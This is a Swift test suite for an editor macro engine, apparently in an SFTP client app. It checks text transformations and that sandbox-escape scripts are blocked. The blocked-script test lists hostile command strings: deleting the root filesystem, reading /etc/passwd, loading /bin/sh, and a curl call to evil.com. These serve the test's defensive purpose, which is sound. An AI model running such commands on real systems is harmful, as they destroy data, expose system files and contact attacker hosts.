import Foundation
@testable import SparkleCore
@testable import SparkleFeatures
import Testing

@Suite("Editor Macro & Sandboxed Automation Engine Tests (Task 12.2)")
struct EditorMacroEngineTests {
    @Test("EditorMacroEngine blocks sandbox escape keywords (CVE-2026-42214)")
    func blocksSandboxEscapeKeywords() {
        let evilScripts = [
            "os.execute('rm -rf /')",
            "io.open('/etc/passwd', 'r')",
            "package.loadlib('/bin/sh', 'main')",
            "require('socket')",
            "process.spawn('curl evil.com')"
        ]

        for script in evilScripts {
            let result = EditorMacroEngine.execute(script: script, initialText: "Safe Text")
            #expect(!result.isSuccess)
            #expect(result.errorMessage != nil)
            #expect(result.outputText == "Safe Text")
        }
    }

    @Test("EditorMacroEngine executes uppercase selection macro")
    func executesUppercaseSelection() {
        let script = "editor.replaceSelection(editor.upper(editor.getSelection()))"
        let initial = "Hello World! Swift 6 Testing."
        let result = EditorMacroEngine.execute(
            script: script,
            initialText: initial,
            selection: "World"
        )

        #expect(result.isSuccess)
        #expect(result.outputText == "Hello WORLD! Swift 6 Testing.")
        #expect(result.selectionText == "WORLD")
    }

    @Test("EditorMacroEngine sorts lines ascending and descending")
    func sortsLines() {
        let initial = "Zebra\nApple\nMango\nBanana"
        let ascResult = EditorMacroEngine.execute(script: "editor.sortLines()", initialText: initial)
        #expect(ascResult.isSuccess)
        #expect(ascResult.outputText == "Apple\nBanana\nMango\nZebra")

        let descResult = EditorMacroEngine.execute(script: "editor.sortLinesDesc()", initialText: initial)
        #expect(descResult.isSuccess)
        #expect(descResult.outputText == "Zebra\nMango\nBanana\nApple")
    }

    @Test("EditorMacroEngine deduplicates and trims lines")
    func deduplicatesAndTrimsLines() {
        let initial = "Line 1  \nLine 2\nLine 1  \nLine 3"
        let dedupResult = EditorMacroEngine.execute(script: "editor.dedup()", initialText: initial)
        #expect(dedupResult.isSuccess)
        #expect(dedupResult.outputText == "Line 1  \nLine 2\nLine 3")

        let trimResult = EditorMacroEngine.execute(script: "editor.trim()", initialText: "Hello   \nWorld \t ")
        #expect(trimResult.isSuccess)
        #expect(trimResult.outputText == "Hello\nWorld")
    }

    @Test("EditorMacroEngine numbers lines sequentially")
    func numbersLines() {
        let initial = "First\nSecond\nThird"
        let result = EditorMacroEngine.execute(script: "editor.numberLines()", initialText: initial)
        #expect(result.isSuccess)
        #expect(result.outputText == "1. First\n2. Second\n3. Third")
    }

    @Test("EditorMacroEngine prettifies JSON payload")
    func prettifiesJSON() {
        let compactJSON = "{\"b\":2,\"a\":1}"
        let result = EditorMacroEngine.execute(script: "editor.jsonPrettify()", initialText: compactJSON)
        #expect(result.isSuccess)
        #expect(result.outputText.contains("\n"))
        #expect(result.outputText.contains("\"a\" : 1"))
    }

    @Test("EditorMacroEngine encodes and decodes Base64")
    func encodesAndDecodesBase64() {
        let text = "SparkleSFTP v0.7.0"
        let encResult = EditorMacroEngine.execute(script: "editor.base64Encode()", initialText: text)
        #expect(encResult.isSuccess)
        let base64 = encResult.outputText

        let decResult = EditorMacroEngine.execute(script: "editor.base64Decode()", initialText: base64)
        #expect(decResult.isSuccess)
        #expect(decResult.outputText == text)
    }

    @Test("EditorMacroEngine adjusts font zoom delta safely")
    func adjustsZoomDelta() {
        let script = "editor.zoomIn()\neditor.zoomIn()\neditor.zoomOut()"
        let result = EditorMacroEngine.execute(script: script, initialText: "Text")
        #expect(result.isSuccess)
        #expect(result.zoomDelta == 1.0)
    }
}
